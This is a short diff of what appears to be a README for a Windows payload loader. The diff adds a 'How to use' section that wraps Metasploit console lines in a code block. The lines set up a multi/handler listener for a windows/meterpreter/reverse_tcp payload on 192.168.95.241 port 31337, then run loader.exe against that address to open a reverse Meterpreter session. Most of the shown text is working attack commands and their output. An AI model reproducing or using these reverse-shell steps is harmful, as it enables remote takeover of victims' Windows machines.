@@ -21,6 +21,8 @@ ToDo:
 1. 64-bit compatability (see message #2)
 2. get a Windows build environment with make
 
+How to use:
+```
 msf > use exploit/multi/handler 
 msf  exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
 PAYLOAD => windows/meterpreter/reverse_tcp
@@ -29,5 +31,6 @@ LPORT => 31337
 msf  exploit(handler) > set LHOST 192.168.95.241
 LHOST => 192.168.95.241
 msf  exploit(handler) > exploit -j
+```
 
 loader.exe 192.168.95.241 31337
